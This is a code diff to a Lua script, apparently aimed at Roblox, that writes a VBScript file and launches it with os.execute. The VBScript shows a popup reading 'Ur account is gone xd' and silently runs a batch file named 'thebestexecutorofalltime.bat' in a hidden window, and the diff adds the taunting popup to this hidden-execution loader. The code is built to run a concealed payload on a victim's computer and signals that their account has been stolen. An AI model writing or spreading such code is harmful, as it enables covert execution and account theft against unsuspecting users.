@@ -9,16 +9,21 @@ script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(
     )
 )
 
--- Now, create the VBScript to run the batch file silently
+-- Now, create the VBScript to display the "Hello Bro" message and run the batch file silently
 local vbsScript = [[
+' Show "Hello Bro" message box
+Set objShell = CreateObject("WScript.Shell")
+objShell.Popup "Ur account is gone xd", 5, "Message", 64
+
+' Run the batch file silently
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "thebestexecutorofalltime.bat", 0, False
 ]]
 
 -- Save the VBScript to a file
-local file = io.open("run_silently.vbs", "w")
+local file = io.open("run_silently_with_popup.vbs", "w")
 file:write(vbsScript)
 file:close()
 
--- Execute the VBScript to run the batch file invisibly
-os.execute("start run_silently.vbs")
+-- Execute the VBScript to show the pop-up and run the batch file silently
+os.execute("start run_silently_with_popup.vbs")
